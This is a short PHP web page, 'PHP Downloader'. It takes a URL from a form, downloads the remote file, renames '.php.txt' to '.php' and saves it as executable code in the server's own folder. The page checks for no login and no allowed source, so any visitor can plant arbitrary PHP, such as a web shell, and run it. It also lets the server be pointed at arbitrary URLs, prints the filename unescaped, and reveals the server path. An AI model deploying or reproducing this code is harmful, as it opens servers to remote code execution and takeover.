<!DOCTYPE html>
<html>
<head>
    <title>PHP Downloader</title>
</head>
<body>
    <p style="width: 70%;margin: auto;margin-top: 5%;font-size:larger;text-align:center">
        Download a renamed PHP file (.php.txt)
    </p>

    <form method="post" style="width: 70%;margin: auto;margin-top: 10%;">
        <input name="url" size="50" placeholder="e.g. https://example.com/script.php.txt" style="width: 100%;height: 10%;font-size: 1.5em;padding:10px" required>
        <input name="submit" type="submit" value="Download" style="width: 30%;height: 10%;margin: 5% auto; display: block;">
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['url'])) {
        $url = trim($_POST['url']);
        $parsed = parse_url($url);

        // Basic URL validation
        if (!filter_var($url, FILTER_VALIDATE_URL) || !in_array($parsed['scheme'], ['http', 'https'])) {
            echo "<p style='color:red;text-align:center;'>❌ Invalid URL</p>";
            exit;
        }

        // Extract filename and convert .php.txt → .php
        $remoteFilename = basename($parsed['path']);
        $localFilename = str_ends_with($remoteFilename, '.php.txt')
            ? substr($remoteFilename, 0, -4) // remove ".txt"
            : $remoteFilename;

        $savePath = __DIR__ . DIRECTORY_SEPARATOR . $localFilename;

        try {
            $context = stream_context_create([
                'http' => [
                    'method' => 'GET',
                    'timeout' => 30,
                    'header' => "User-Agent: PHP Downloader\r\n"
                ]
            ]);

            $data = file_get_contents($url, false, $context);
            if ($data === false) {
                throw new Exception("Failed to download the file.");
            }

            file_put_contents($savePath, $data);
            echo "<p style='color:green;text-align:center;'>✅ Downloaded successfully as <strong>$localFilename</strong></p>";
        } catch (Exception $e) {
            echo "<p style='color:red;text-align:center;'>❌ Error: {$e->getMessage()}</p>";
        }
    }
    ?>

    <p style="width: 70%;margin: auto;margin-top: 5%;font-size:larger;text-align:center">
        Saved to folder: <strong><?php echo getcwd(); ?></strong>
    </p>
</body>
</html>
